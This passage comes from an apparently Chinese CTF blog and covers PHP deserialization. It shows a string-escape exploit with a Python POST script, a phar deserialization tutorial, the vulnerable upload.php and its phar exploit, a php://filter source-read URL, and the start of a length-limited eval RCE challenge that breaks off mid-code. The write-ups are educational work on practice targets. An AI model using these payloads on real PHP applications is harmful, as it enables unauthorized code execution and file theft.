class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$a</span>-&gt;sql-&gt;nickname-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&#x27;&quot;;s:3:&quot;ccc&quot;;&#x27;</span>.serialize(<span class="variable">$a</span>).<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo $pauload;</span></span><br><span class="line"><span class="variable">$p</span>=str_repeat(<span class="string">&#x27;union&#x27;</span>,strlen(<span class="variable">$payload</span>)).<span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://8f273265-29ea-44e2-afae-70823a82f76f.node3.buuoj.cn/update.php&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span>:<span class="string">&#x27;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:3:&quot;ccc&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/cSms4H"><img src="https://z3.ax1x.com/2021/03/27/cSms4H.png" alt="cSms4H.png"></a></p><p>解密登陆后拿到flag</p><p><a href="https://imgtu.com/i/cSmggI"><img src="https://z3.ax1x.com/2021/03/27/cSmggI.png" alt="cSmggI.png"></a></p><p>参考：</p><p><a href="https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p><p><a href="https://ctf.ieki.xyz/buuoj/gyctf-2020.html">https://ctf.ieki.xyz/buuoj/gyctf-2020.html</a></p><p><a href="https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/">https://www.1ight.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化学习</title>
    <link href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="phar文件结构分析"><a href="#phar文件结构分析" class="headerlink" title="phar文件结构分析"></a>phar文件结构分析</h1><p> 大体来说 Phar 结构由4部分组成</p><p><strong>1.stub ：phar文件标识</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Phar::mapPhar();</span><br><span class="line">include &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;index.php&#39;;</span><br><span class="line">__HALT_COMPILER();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。</p><p><strong>2. a manifest describing the contents</strong><br> phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p><strong>3. the file contents</strong><br> 被压缩文件的内容。</p><p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong><br> 签名，放在文件末尾，格式如下</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>把一个序列化的对象，储存在phar格式的文件中，生成后的文件可以以任意格式保存，通过文件包含函数（下图），用phar://协议包含文件，就可以把对象反序列化。<br>php中大部分文件函数在通过phar://解析phar文件时，会将meta-data进行反序列化，受影响的函数如下：</p><p><a href="https://imgtu.com/i/6Xd2zF"><img src="https://z3.ax1x.com/2021/03/25/6Xd2zF.png" alt="6Xd2zF.png"></a></p><p>利用原理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destructed&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的<code>__toString()</code>方法返回<code>$this-&gt;Filename</code>，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件<code>$this-&gt;token</code> 等于<code>$_SESSION[&#39;user&#39;]</code>，<code>$_SESSION[&#39;user&#39;]</code>可从文件名中获得。最后构造phar://包含文件。</p><p>开始用弱口令admin password登陆</p><p><a href="https://imgtu.com/i/6XdgRU"><img src="https://z3.ax1x.com/2021/03/25/6XdgRU.png" alt="6XdgRU.png"></a></p><p>弱口令登陆进去，发现可以上传文件，但是没有给出返回路径，观察到file参数可能可以利用</p><p><a href="https://imgtu.com/i/6XdsI0"><img src="https://z3.ax1x.com/2021/03/25/6XdsI0.png" alt="6XdsI0.png"></a></p><p>只要参数中不以home和upload结尾就会自动把后缀名改成cc.fxxkyou!</p><p><a href="https://imgtu.com/i/6Xd6iV"><img src="https://z3.ax1x.com/2021/03/25/6Xd6iV.png" alt="6Xd6iV.png"></a></p><p>利用php://filter读取文件源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bf4bee72-3946-49dc-b598-48b3dc0ac6aa.node3.buuoj.cn&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6XdcGT"><img src="https://z3.ax1x.com/2021/03/25/6XdcGT.png" alt="6XdcGT.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//home.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å½åå¼ç¨çæ¯ &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的<code>__toString()</code>方法返回<code>$this-&gt;Filename</code>，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件<code>$this-&gt;token</code> 等于<code>$_SESSION[&#39;user&#39;]</code>，<code>$_SESSION[&#39;user&#39;]</code>可从文件名中获得。最后构造phar://包含文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.php</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    ä¸ä¼ æä»¶</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸ä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sandbox</span> = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @mkdir(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> Uploader();</span><br><span class="line">    <span class="variable">$uploader</span>-&gt;upload(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="variable">$uploader</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传txt文件，得到$_SESSION[‘user’]</p><p><a href="https://imgtu.com/i/6Xdraq"><img src="https://z3.ax1x.com/2021/03/25/6Xdraq.png" alt="6Xdraq.png"></a></p><p>构造exp，生成phar文件并上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;GXY57eb0a54186eb32ad70deb2e3da0b903&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Uploader();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dc0a112a-07ab-4130-a0cc-497b03dde141.node3.buuoj.cn&#x2F;home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;ef30d6288c320cd6e01dc95841a44ad0&#x2F;GXY57eb0a54186eb32ad70deb2e3da0b903.txt</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6XdDZn"><img src="https://z3.ax1x.com/2021/03/25/6XdDZn.png" alt="6XdDZn.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nepctf部分wp</title>
    <link href="/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/"/>
    <url>/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h1><p>长度限制rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span 